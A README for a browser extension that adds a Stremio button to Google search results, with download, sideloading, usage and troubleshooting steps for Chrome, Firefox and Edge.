# 🎉 stremio-google-search-extension - Watch Instantly from Google Search!

## 🚀 Getting Started
Welcome to the stremio-google-search-extension! This extension allows you to watch movies and shows directly through Stremio instead of other streaming services, making your viewing experience smoother and more convenient.

## 📥 Download & Install
To get started, visit the Releases page to download the extension. 

[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/shamandanila/stremio-google-search-extension/releases)

Simply follow these steps:

1. Click the link above to go to the Releases page.
2. Find the latest version of the extension.
3. Click on the downloadable file (usually a `.zip` or `.crx` format).
4. Save the file to a location on your computer that you can easily find.

## 🛠️ Installation Instructions
After downloading the extension, follow these steps:

1. **For Chrome Users:**
   - Open Chrome and navigate to `chrome://extensions/`.
   - Enable "Developer mode" in the top right corner.
   - Drag and drop the downloaded `.crx` file into the Extensions page.
   - Confirm the installation when prompted.

2. **For Firefox Users:**
   - Open Firefox and go to `about:addons`.
   - Click on the "Gear" icon in the top right and select "Install Add-on From File."
   - Choose the downloaded `.xpi` file and install it.

3. **For Edge Users:**
   - Open Edge and go to `edge://extensions/`.
   - Enable "Developer mode" in the top right corner.
   - Drag and drop the downloaded `.crx` file into the Extensions page.
   - Confirm the installation when prompted.

4. **For Other Browsers:**
   - Check your browser's extension settings or documentation for specific installation guidelines.

## 🎬 How to Use
Once installed, the Stremio button will appear in your browser when you perform a Google search for movies or shows.

1. Search for your desired movie or show using Google.
2. Find the Stremio button that appears beside your search results.
3. Click the Stremio button to open Stremio directly and start watching.

## 📋 Features
- **Direct Access**: Watch your favorite content instantly from Google Search.
- **Supported Streaming Services**: Works seamlessly with various streaming services supported by Stremio.
- **User-Friendly**: Designed for easy use by everyone, regardless of technical skills.

## 📇 System Requirements
- **Browser Support**: This extension works with the latest versions of Chrome, Firefox, and Edge.
- **Operating System**: Compatible with Windows, macOS, and Linux.
- **Stremio App**: You need to have the Stremio app installed on your device. You can download it from the [Stremio website](https://strem.io/).

## 🆘 Troubleshooting
If you encounter issues, try the following steps:

1. **Check Permissions**: Ensure your browser allows extensions and is not blocking the Stremio extension.
2. **Update Browser**: Make sure your browser is up to date to support the latest features.
3. **Reinstall Extension**: If issues persist, uninstall and reinstall the extension following the installation instructions.
